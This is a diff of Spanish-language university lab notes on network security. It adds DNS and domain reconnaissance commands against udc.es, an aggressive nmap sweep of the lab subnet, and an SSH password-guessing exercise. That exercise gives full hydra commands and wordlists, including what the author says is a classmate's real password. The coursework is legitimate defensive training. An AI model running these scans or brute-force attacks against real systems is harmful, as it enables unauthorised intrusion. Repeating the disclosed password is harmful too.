@@ -445,8 +445,63 @@ shell            # Acceder a la terminal normal de la víctima
 -t	        # Modo texto/log para scripts
 -p	        # Mostrar solo procesos (más limpio)
 
-```
 
+# INFORMACIÓN SOBRE DOMINIOS
+
+- host (cosultas básicas dominio)
+host udc.es                          # IPv4 del dominio
+host -t AAAA nombre.dominio          # IPv6 del dominio  
+host -t NS nombre.dominio            # Servidores DNS
+host -t MX nombre.dominio            # Servidores correo
+host www.nombre.dominio              # Subdominio específico
+
+- nslokkup (consultas interactivas dominio):
+nslookup nombre.dominio                     # IP básica del dominio
+nslookup -type=A nombre.dominio             # Registros A (IPv4)
+nslookup -type=AAAA nombre.dominio          # Registros AAAA (IPv6)
+nslookup -type=NS nombre.dominio            # Servidores DNS
+nslookup -type=MX nombre.dominio            # Servidores correo
+nslookup -type=SOA nombre.dominio           # Información zona DNS
+nslookup -type=TXT nombre.dominio           # Textos informativos
+
+-dig (consultas DNS avanzadas):
+dig nombre.dominio                          # Consulta completa
+dig nombre.dominio A +short                 # IPv4 resumido
+dig nombre.dominio AAAA +short              # IPv6 resumido  
+dig nombre.dominio NS +short                # DNS servers resumido
+dig nombre.dominio MX +short                # Mail servers resumido
+dig @8.8.8.8 nombre.dominio                 # Usar DNS específico
+dig nombre.dominio ANY                      # Todos los registros
+dig -x 193.144.53.84                        # Búsqueda inversa
+
+# whois (Información registro dominio)
+whois nombre.dominio                        # Info registro dominio
+whois -h whois.ripe.net 193.144.53.84       # Info IP específica
+
+
+# dnsenum (Enumeración automática)
+dnsenum nombre.dominio                      # Escaneo completo
+
+
+# dnsrecon (Enumeración avanzada)
+dnsrecon -d udc.es                          # Escaneo completo dominio
+dnsrecon -d udc.es -t brt                   # Fuerza bruta subdominios
+dnsrecon -r 193.144.48.0-193.144.63.255     # Escaneo inverso IPs
+
+
+# Transferencia de zona
+dig @MIIP axfr nombre.dominio
+
+
+# Información Webs/CMS
+whatweb udc.es                       # Tecnologías web
+curl -I udc.es                       # Headers HTTP
+wget --spider -r -l 1 udc.es         # Estructura sitio
+
+
+--------------------------------------------------------------------
+
+```
 
 
 <br>
@@ -1870,7 +1925,40 @@ https://www.usc.gal/gl [200 OK] Apache, Content-Language[gl], Country[UNITED STA
 
 ### **Apartado o) Trate de sacar un perfil de los principales sistemas que conviven en su red de prácticas, puertos accesibles, fingerprinting, etc.**
 
+Vamos a usar dos tipos de nmap:
 
+1- NMAP con la flag - A para escanear toda la red: **nmap -A IP ROUTER (10.11.48.1)/23**
+
+El comando nmap -A 10.11.48.1/23 realiza un escaneo agresivo y completo de toda la red 10.11.48.0/23.
+
+- -A = "Agressive" - Activa TODO:
+
+        Detección de SO (-O)
+
+        Detección de versiones (-sV)
+
+        Ejecución de scripts (--script)
+
+        Traceroute (--traceroute)
+
+-  10.11.48.1/23 = Escanea 512 IPs (10.11.48.0 - 10.11.49.255)
+
+<br>
+
+2- NMAP con la flag -T4:
+
+```bash
+nmap -T4 10.11.48.0/23 > /home/lsi/nmap_full.txt
+```
+ Guardamos el resultado de todos los perfiles en un txt.
+ 
+nmap -T4 10.11.48.0/23 está:
+
+- Escaneando los 512 hosts de la red
+
+- Revisando los 1000 puertos más comunes por cada host
+
+-  A máxima velocidad (T4)
 
 <br>
 <br>
@@ -1885,15 +1973,110 @@ https://www.usc.gal/gl [200 OK] Apache, Content-Language[gl], Country[UNITED STA
 
 
 
-
 ### **Apartado p) Realice algún ataque de “password guessing” contra su servidor ssh y compruebe que el analizador de logs reporta las correspondientes alarmas.**
 
-Usar Medusa o Hydra para atacar. 
+> Usar Medusa o Hydra para atacar. 
 
-Probar sobre un usuario mejor, no sobre la red -> Fuerza bruta bucle for sobre el usuario de lsi del compañero (no poner diccionario de usuarios, solo de contraseñas).
+> Probar sobre un usuario mejor, no sobre la red -> Fuerza bruta bucle for sobre el usuario de lsi del compañero (no poner diccionario de usuarios, solo de contraseñas).
 
 
+En mi caso voy a utilizar hydra, puesto que ya lo había usado previamente.
+Tendremos que hacer los siguiente:
 
+```bash
+apt install hydra -y
+```
+
+
+1-Crear un fichero con los usuarios posibles:
+```bash
+# Crear archivo de usuarios
+cat > /home/lsi/users.txt << 'EOF'
+lsi
+admin
+root
+user
+ubuntu
+debian
+EOF
+```
+
+2-Crear un fichero con las contraseñas posibles (la suya es la primera del txt):
+```bash
+cat > /home/lsi/passwords.txt << 'EOF'
+20022025
+password
+123456
+12345678
+1234
+12345
+qwerty
+admin
+password123
+secret
+lsi
+lsi123
+lsi2025
+lsi2002
+LsI2025
+lsi@2025
+02022025
+200225
+022025
+20252002
+25022002
+linux
+ubuntu
+debian
+ssh
+root
+toor
+2002
+2025
+20022024
+20022023
+20022026
+Password123
+Admin123
+Welcome123
+ChangeMe123
+123
+1
+a
+admin123
+root123
+virtual
+virtual;..
+EOF
+```
+
+
+3-Ejecutar Hydra con estos dos archivos sobre la máquina de mi compañero:
+```bash
+hydra -L /home/lsi/users.txt -P /home/lsi/passwords.txt -t 4 -W 1 -f -V ssh://10.11.48.175
+```
+
+-L /home/lsi/users.txt     → Lee usuarios de este archivo (solo "lsi")
+-P /home/lsi/passwords.txt → Lee 40 contraseñas de este archivo  
+-t 4                       → Usa 4 hilos a la vez (más rápido)
+-W 1                       → Espera 1 segundo entre intentos
+-f                         → PARA cuando encuentre la contraseña correcta
+-V                         → Muestra progreso en pantalla
+ssh://10.11.48.175         → Ataca el servicio SSH de esta IP
+
+En resumen, este comando comprueba para cada usuario del users.txt todas las contraseñas posibles del passwords.txt. Si algún usuario y contraseña coincide ya nos lo dice.
+
+<img width="1898" height="271" alt="imagen" src="https://github.com/user-attachments/assets/992e1924-2c2c-4bbc-9eff-15122b6b33e3" />
+
+Ahí lo vemos.
+
+<br>
+Mientras el atacante realiza el ataque, la víctima debe revisar sus logs:
+
+```bash
+# En la máquina víctima, ver intentos
+tail -f /var/log/auth.log | grep "lsi"
+```
 
 <br>
 
@@ -1919,6 +2102,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
